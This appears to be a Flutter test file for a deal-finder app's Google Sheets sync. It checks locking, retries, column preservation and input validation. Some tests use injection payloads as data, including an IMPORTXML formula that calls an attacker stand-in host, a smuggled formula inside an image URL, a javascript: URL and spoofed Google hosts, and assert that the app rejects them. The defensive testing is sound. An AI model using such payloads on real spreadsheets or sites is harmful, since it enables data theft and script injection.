import 'dart:convert';

import 'package:flutter_test/flutter_test.dart';
import 'package:deal_finder_app/src/data/sheets/sheet_models.dart';
import 'package:deal_finder_app/src/data/sheets/sheets_gateway.dart';
import 'package:deal_finder_app/src/domain/models/target.dart';
import 'package:deal_finder_app/src/domain/models/run_snapshot.dart';
import 'package:deal_finder_app/src/domain/models/sync_job.dart';
import 'package:deal_finder_app/src/domain/repositories/repositories.dart';
import 'package:deal_finder_app/src/application/pipeline/cancellation.dart';
import 'package:deal_finder_app/src/application/sync/sync_coordinator.dart';

import 'support/fakes.dart';

class FakeSheets implements SheetsGateway {
  final grids = <String, List<List<Object?>>>{
    for (final e in managedTabs.entries) e.key: [List.of(e.value)],
  };
  final writes = <String>[];
  String? failTab;
  @override
  Future<Map<String, int>> tabs(Cancellation c) async => {
    for (final e in grids.keys.indexed) e.$2: e.$1,
  };
  @override
  Future<SheetSnapshot> read(String title, Cancellation c) async =>
      SheetSnapshot(
        id: grids.keys.toList().indexOf(title),
        title: title,
        values: grids[title]!,
      );
  @override
  Future<void> apply(
    SheetSnapshot expected,
    List<CellEdit> edits,
    Cancellation c,
  ) async {
    c.check();
    if (failTab == expected.title) {
      throw StateError('simulated connection loss');
    }
    if ((await read(expected.title, c)).fingerprint != expected.fingerprint) {
      throw StateError('stale');
    }
    final grid = grids[expected.title]!;
    for (final edit in edits) {
      while (grid.length <= edit.row) {
        grid.add([]);
      }
      while (grid[edit.row].length <= edit.column) {
        grid[edit.row].add(null);
      }
      grid[edit.row][edit.column] = edit.cell.value;
    }
    writes.add(expected.title);
  }

  @override
  Future<void> initialize(Cancellation c) async {}
  @override
  void close() {}
}

class MemorySyncJobs implements SyncRepository {
  final jobs = <String, SyncJob>{};
  @override
  Future<void> saveSyncJob(SyncJob job) async {
    jobs[job.id] = job;
  }

  @override
  Stream<List<SyncJob>> watchSyncJobs() => Stream.value(jobs.values.toList());
}

void main() {
  test(
    'preview ownership prevents concurrent post-run writes and stale reuse',
    () async {
      final coordinator = SyncCoordinator(MemorySyncJobs());
      final lease = coordinator.acquire();
      expect(coordinator.busy, isTrue);
      expect(coordinator.acquire, throwsStateError);
      final job = await coordinator.enqueue(
        RunSnapshot(
          runId: 'lock-test',
          createdAt: DateTime.utc(2026),
          deals: [],
          listings: [],
          targets: [],
        ),
        '1234567890abcdefghijklmnop',
      );
      final gateway = FakeSheets();
      await expectLater(
        coordinator.execute(job, gateway, Cancellation()),
        throwsStateError,
      );
      expect(gateway.writes, isEmpty);
      await coordinator.execute(job, gateway, Cancellation(), operation: lease);
      expect(
        coordinator.busy,
        isTrue,
        reason: 'The preview caller still owns its operation',
      );
      coordinator.release(lease);
      expect(coordinator.busy, isFalse);
      await expectLater(
        coordinator.execute(job, gateway, Cancellation(), operation: lease),
        throwsStateError,
      );
    },
  );
  test(
    'spreadsheet URL validation rejects unexpected hosts and credentials',
    () {
      const id = '1234567890abcdefghijklmnop';
      expect(
        spreadsheetId('https://docs.google.com/spreadsheets/d/$id/edit#gid=1'),
        id,
      );
      expect(spreadsheetId(id), id);
      for (final bad in [
        'https://docs.google.com.evil.test/spreadsheets/d/$id',
        'http://docs.google.com/spreadsheets/d/$id',
        'https://user@docs.google.com/spreadsheets/d/$id',
        'short',
        'https://evil.test/?id=$id',
      ]) {
        expect(() => spreadsheetId(bad), throwsFormatException);
      }
    },
  );
  test(
    'untrusted strings never become formulas; images are explicitly validated',
    () {
      final cells = cellRequests(1, [
        const CellEdit(1, 0, SheetCell('=IMPORTXML("https://evil.test", "x")')),
        const CellEdit(1, 1, SheetCell('+cmd')),
        CellEdit(1, 3, SheetCell.image('https://example.com/image.jpg')),
      ]);
      final json = jsonEncode(cells);
      expect(json, contains('stringValue'));
      expect(json, contains('formulaValue'));
      expect(
        SheetCell.image('https://example.com/a"),IMPORTXML("evil').value,
        isNull,
      );
      expect(SheetCell.image('javascript:alert(1)').value, isNull);
      expect(SheetCell.image(null).value, isNull);
      expect(
        cells,
        hasLength(2),
        reason: 'Custom column 2 must not be touched',
      );
    },
  );
  test(
    'target import handles reordered headers, preamble and optional policy',
    () {
      final headers = ['Custom', ...priceHeaders.reversed];
      final record = targetCells(
        Target.fromJson({
          ...sampleTarget.toJson(),
          'allowBundle': true,
          'searchMode': 'itemName',
        }),
      );
      final remote = SheetSnapshot(
        id: 1,
        title: 'Price List',
        values: [
          ['My personal catalog'],
          headers,
          headers
              .map((h) => h == 'Custom' ? 'preserve me' : record[h]?.value)
              .toList(),
        ],
      );
      final targets = readTargets(remote, [sampleTarget], () => 'new-id');
      expect(targets.single.id, sampleTarget.id);
      expect(targets.single.allowBundle, isTrue);
      expect(targets.single.searchMode, SearchMode.itemName);
      final edits = targetExport(remote, targets);
      expect(edits.every((e) => e.row == 2 && e.column > 0), isTrue);
      expect(remote.values.first.single, 'My personal catalog');
    },
  );
  test('duplicate and malformed remote targets fail the whole preview', () {
    final cells = targetCells(sampleTarget),
        row = priceHeaders.map((h) => cells[h]!.value).toList();
    expect(
      () => readTargets(
        SheetSnapshot(
          id: 1,
          title: 'Price List',
          values: [priceHeaders, row, row],
        ),
        [],
        () => 'new',
      ),
      throwsStateError,
    );
    final bad = List<Object?>.of(row)
      ..[priceHeaders.indexOf('Deal Price (PHP)')] = 'NaN';
    expect(
      () => readTargets(
        SheetSnapshot(id: 1, title: 'Price List', values: [priceHeaders, bad]),
        [],
        () => 'new',
      ),
      throwsStateError,
    );
  });
  test(
    'managed output replacement leaves custom columns and preamble intact',
    () {
      final remote = SheetSnapshot(
        id: 1,
        title: 'Current Deals',
        values: [
          ['Notes: keep this'],
          [...currentHeaders, 'Custom'],
          [...List.filled(currentHeaders.length, 'old'), '=SUM(A1:A2)'],
        ],
      );
      final edits = replaceManagedColumns(remote, currentHeaders, []);
      expect(edits, hasLength(currentHeaders.length));
      expect(
        edits.every(
          (e) =>
              e.row == 2 &&
              e.column < currentHeaders.length &&
              e.cell.value == null,
        ),
        isTrue,
      );
    },
  );
  test('History keeps first-seen and arbitrary reordered custom columns', () {
    final remote = SheetSnapshot(
      id: 1,
      title: 'History',
      values: [
        ['Custom', 'Last Seen Date', 'First Seen Date', 'Listing ID'],
        ['my formula', '2026-08-01', '2026-07-01', sampleDeal.id],
      ],
    );
    final edits = historyUpdates(remote, [
      sampleDeal,
      sampleDeal,
    ], '2026-09-09');
    expect(edits, hasLength(1));
    expect(edits.single.column, 1);
    expect(edits.single.cell.value, '2026-09-09');
  });
  test(
    'durable sync retries skip committed tabs and deduplicate the captured run',
    () async {
      final repository = MemorySyncJobs(),
          gateway = FakeSheets()..failTab = 'All Listings';
      final coordinator = SyncCoordinator(repository), c = Cancellation();
      final snapshot = RunSnapshot(
        runId: 'scan-1',
        createdAt: DateTime.utc(2026, 9, 9),
        deals: [sampleDeal],
        listings: [sampleListing],
        targets: [sampleTarget],
      );
      final job = await coordinator.enqueue(
        snapshot,
        '1234567890abcdefghijklmnop',
      );
      await expectLater(coordinator.execute(job, gateway, c), throwsStateError);
      final failed = repository.jobs[job.id]!;
      expect(failed.state, 'failed');
      expect(failed.completedTabs, {'History'});
      expect(gateway.grids['History'], hasLength(2));
      gateway.failTab = null;
      await coordinator.execute(failed, gateway, c);
      expect(repository.jobs[job.id]!.state, 'completed');
      expect(gateway.writes.where((t) => t == 'History'), hasLength(1));
      expect(gateway.grids['Current Deals']![1][2], 8500);
      expect(
        await coordinator.enqueue(snapshot, job.destination),
        repository.jobs[job.id],
      );
    },
  );
  test(
    'History uncertain response can be replayed without appending twice',
    () async {
      final gateway = FakeSheets(), c = Cancellation();
      var remote = await gateway.read('History', c);
      await gateway.apply(
        remote,
        historyUpdates(remote, [sampleDeal], '2026-09-09'),
        c,
      );
      remote = await gateway.read('History', c);
      await gateway.apply(
        remote,
        historyUpdates(remote, [sampleDeal], '2026-09-09'),
        c,
      );
      expect(gateway.grids['History'], hasLength(2));
    },
  );
}
